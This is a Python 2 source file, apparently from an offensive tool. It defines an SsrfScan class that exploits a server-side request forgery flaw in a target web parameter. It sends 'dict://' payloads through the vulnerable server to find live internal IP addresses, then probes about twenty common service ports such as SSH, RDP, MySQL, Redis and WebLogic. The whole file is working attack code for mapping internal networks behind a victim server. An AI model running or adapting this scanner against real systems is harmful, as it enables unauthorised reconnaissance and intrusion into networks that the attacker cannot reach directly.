#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : mr.chery (mr.chery666@gmail.com)

import requests
import eventlet
from IPy import IP
from tools import payload_set

requests = eventlet.import_patched('requests.__init__')


class SsrfScan(object):
    def __init__(self, url, param, ip_pool):
        self.url = url
        self.param = param
        self.ip_pool = ip_pool

    def scan_init(self):
        """
        初始化扫描函数线程
        :return:
        """
        alive_port = {}
        ip_pool = IP(self.ip_pool)
        pool = eventlet.GreenPool(35)
        for ip in ip_pool:
            port = pool.spawn(self.ip_scan, str(ip), alive_port)
        return port.wait()

    def ip_scan(self, ip, alive_port):
        """
        存活IP扫描函数并调用端口扫描函数
        :param ip: 需要扫描的IP
        :param alive_port: 存放存活的port
        :return:
        """
        payload = "dict://" + ip
        scan_url = payload_set.url_payload_set(self.url, self.param, payload)
        print scan_url
        try:
            rsp = requests.get(scan_url, timeout=3)
            rsp.close()
            if rsp:
                port = self.port_scan(ip, alive_port)
                return port
        except Exception as e:
            pass

    def port_scan(self, ip, alive_port):
        ports = [
            '21', '22', '23', '53', '80', '135', '139', '443', '445', '1080', '1433', '1521', '3306', '3389', '4899',
            '8080', '6379',
            '7001', '8000', '8081', '8082']
        for i in xrange(0, len(ports)):
            payload = "dict://" + ip + ":" + ports[i]
            scan_url = payload_set.url_payload_set(self.url, self.param, payload)
            try:
                rsp = requests.get(scan_url, timeout=3)
                rsp.close()
                if rsp:
                    ip_number = str(IP(ip).int())
                    alive_port.setdefault(ip_number, []).append(ports[i])
            except Exception as e:
                pass
        return alive_port


